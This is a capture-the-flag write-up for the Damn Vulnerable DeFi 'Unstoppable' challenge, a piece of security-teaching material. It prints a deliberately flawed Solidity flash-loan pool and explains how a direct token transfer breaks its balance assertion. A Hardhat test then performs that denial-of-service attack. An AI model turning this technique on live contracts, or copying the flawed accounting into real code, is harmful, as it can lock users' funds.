# Damn Vulnerable Defi: 1. Unstoppable

> There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
> If only there was a way to attack and stop the pool from offering flash loans... You start with 100 DVT tokens in balance.

**Objective of CTF:**

- Break the flash loan (denial of service) such that no one will be able to take loans anymore.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
  function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable {
  UnstoppableLender private immutable pool;
  address private immutable owner;

  constructor(address poolAddress) {
    pool = UnstoppableLender(poolAddress);
    owner = msg.sender;
  }

  // Pool will call this function during the flash loan
  // This will give `amount` tokens from this contract back to the pool
  function receiveTokens(address tokenAddress, uint256 amount) external {
    require(msg.sender == address(pool), "Sender must be pool");
    require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
  }

  function executeFlashLoan(uint256 amount) external {
    require(msg.sender == owner, "Only owner can execute flash loan");
    pool.flashLoan(amount);
  }
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableLender is ReentrancyGuard {
  IERC20 public immutable damnValuableToken;
  uint256 public poolBalance;

  constructor(address tokenAddress) {
    require(tokenAddress != address(0), "Token address cannot be zero");
    damnValuableToken = IERC20(tokenAddress);
  }

  function depositTokens(uint256 amount) external nonReentrant {
    require(amount > 0, "Must deposit at least one token");

    // transfer token from sender, sender must have first approved them.
    damnValuableToken.transferFrom(msg.sender, address(this), amount);
    poolBalance = poolBalance + amount;
  }

  function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore);

    // send tokens to the borrower
    damnValuableToken.transfer(msg.sender, borrowAmount);

    // receives the lent tokens back from the borrower
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
  }
}
```

## The Attack

Let us examine how this flash loan works. Users are expected to deposit tokens with `depositTokens` function, which calls `transferFrom` function as we know from ERC20. Of course, user must have approved the lender tokens so that it can call `transferFrom`.When someone wants to take a loan, they simply call `flashLoan` to request a given amount.

The problematic looking line is the following:

- `assert(poolBalance == balanceBefore)`

The pool balance is not taken from `token.balanceOf(poolAddress)` but instead kept within the lender storage with the `poolBalance` variable. You may have heard of "single source of truth" practice in programming; here, we have two different variable that are tracking the pool balance.

Unfortunately, `poolBalance` does not take into account transfers via direct token functions, without using the `depositTokens` function! So, if we were to transfer some tokens via `transfer` function of ERC20, that will break assertion at the aforementioned line, rendering the `flashLoan` function useless.

## Proof of Concept

Here is a Hardhat test to demonstrate the attack.

```typescript
describe('Damn Vulnerable Defi 1: Unstoppable', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let victim: SignerWithAddress;

  let token: DamnValuableToken;
  let pool: UnstoppableLender;
  let receiverContract: ReceiverUnstoppable;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000'); // pool has 1M * 10**18 tokens
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100'); // attacker has 100 tokens

  before(async () => {
    [owner, attacker, victim] = await ethers.getSigners();
    token = await ethers.getContractFactory('DamnValuableToken', owner).then(f => f.deploy());
    pool = await ethers.getContractFactory('UnstoppableLender', owner).then(f => f.deploy(token.address));
    receiverContract = await ethers.getContractFactory('ReceiverUnstoppable', victim).then(f => f.deploy(pool.address));

    // deposit tokens to the pool
    await token.approve(pool.address, TOKENS_IN_POOL);
    await pool.depositTokens(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    // give attacker balance
    await token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
    expect(await token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

    // show it's possible for some other user to take out a flash loan
    await receiverContract.executeFlashLoan(10);
  });

  it('should rek the flash loan', async () => {
    // send some money without `deposit`
    token.connect(attacker).transfer(pool.address, ethers.utils.parseEther('1'));
  });

  after(async () => {
    // it should no longer be possible to execute flash loans
    await expect(receiverContract.executeFlashLoan(10)).to.be.reverted;
  });
});
```
